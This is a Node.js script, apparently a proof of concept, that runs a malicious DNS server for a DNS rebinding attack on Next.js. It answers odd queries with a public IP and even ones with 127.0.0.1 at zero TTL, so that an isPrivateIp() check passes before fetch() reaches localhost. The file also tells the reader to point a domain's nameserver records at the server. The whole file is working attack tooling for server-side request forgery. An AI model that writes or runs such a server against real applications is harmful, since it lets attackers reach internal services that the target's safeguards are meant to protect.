#!/usr/bin/env node
/**
 * DNS Rebinding Server for Next.js SSRF PoC
 * ==========================================
 * 
 * This server alternates DNS responses between public and private IPs.
 * Query 1: Returns public IP (91.99.139.110) - passes isPrivateIp() check
 * Query 2: Returns 127.0.0.1 - fetch() hits localhost = SSRF!
 * 
 * Run with: sudo node dns_rebinding_server.js
 * (Requires root for port 53)
 */

const dgram = require('dgram');
const server = dgram.createSocket('udp4');

// Configuration
const PUBLIC_IP = '91.99.139.110';  // Your public IP
const PRIVATE_IP = '127.0.0.1';     // SSRF target
const DNS_PORT = 53;
const DOMAIN = 'ssrf.werz.xyz';

// Track query count per client
const queryCount = new Map();

function ipToBytes(ip) {
  return ip.split('.').map(n => parseInt(n));
}

function buildDnsResponse(query, ip) {
  const response = Buffer.alloc(512);
  let offset = 0;
  
  // Copy transaction ID from query
  query.copy(response, 0, 0, 2);
  offset = 2;
  
  // Flags: Standard response, no error
  response.writeUInt16BE(0x8180, offset); offset += 2;
  
  // Questions: 1
  response.writeUInt16BE(1, offset); offset += 2;
  
  // Answers: 1
  response.writeUInt16BE(1, offset); offset += 2;
  
  // Authority RRs: 0
  response.writeUInt16BE(0, offset); offset += 2;
  
  // Additional RRs: 0
  response.writeUInt16BE(0, offset); offset += 2;
  
  // Copy the question section from query
  const questionStart = 12;
  let questionEnd = questionStart;
  while (query[questionEnd] !== 0) questionEnd++;
  questionEnd += 5; // null byte + type (2) + class (2)
  
  query.copy(response, offset, questionStart, questionEnd);
  offset += (questionEnd - questionStart);
  
  // Answer section
  // Name pointer to question
  response.writeUInt16BE(0xc00c, offset); offset += 2;
  
  // Type A
  response.writeUInt16BE(1, offset); offset += 2;
  
  // Class IN
  response.writeUInt16BE(1, offset); offset += 2;
  
  // TTL: 0 seconds (no caching!)
  response.writeUInt32BE(0, offset); offset += 4;
  
  // RDLENGTH: 4 bytes for IPv4
  response.writeUInt16BE(4, offset); offset += 2;
  
  // IP address
  const ipBytes = ipToBytes(ip);
  response[offset++] = ipBytes[0];
  response[offset++] = ipBytes[1];
  response[offset++] = ipBytes[2];
  response[offset++] = ipBytes[3];
  
  return response.slice(0, offset);
}

function extractDomain(query) {
  let domain = '';
  let offset = 12;
  while (query[offset] !== 0) {
    const len = query[offset++];
    for (let i = 0; i < len; i++) {
      domain += String.fromCharCode(query[offset++]);
    }
    if (query[offset] !== 0) domain += '.';
  }
  return domain;
}

server.on('message', (query, rinfo) => {
  const domain = extractDomain(query);
  const clientKey = `${rinfo.address}:${domain}`;
  
  // Get and increment query count for this client
  const count = (queryCount.get(clientKey) || 0) + 1;
  queryCount.set(clientKey, count);
  
  // Alternate: odd queries = public IP, even = private IP
  const ip = (count % 2 === 1) ? PUBLIC_IP : PRIVATE_IP;
  
  console.log(`[${new Date().toISOString()}] Query #${count} from ${rinfo.address} for ${domain} -> ${ip}`);
  
  const response = buildDnsResponse(query, ip);
  server.send(response, rinfo.port, rinfo.address);
});

server.on('listening', () => {
  console.log('='.repeat(60));
  console.log(' DNS Rebinding Server for Next.js SSRF PoC');
  console.log('='.repeat(60));
  console.log('');
  console.log('Listening on port', DNS_PORT);
  console.log('');
  console.log('Pattern:');
  console.log(`  Query 1: ${PUBLIC_IP} (passes isPrivateIp check)`);
  console.log(`  Query 2: ${PRIVATE_IP} (fetch hits localhost)`);
  console.log('');
  console.log('Configure your domain NS to point to this server.');
  console.log('Or test with: dig @localhost ssrf.werz.xyz');
  console.log('='.repeat(60));
});

server.on('error', (err) => {
  console.error('DNS server error:', err);
  if (err.code === 'EACCES') {
    console.error('Run with sudo to bind to port 53');
  }
  server.close();
});

server.bind(DNS_PORT);
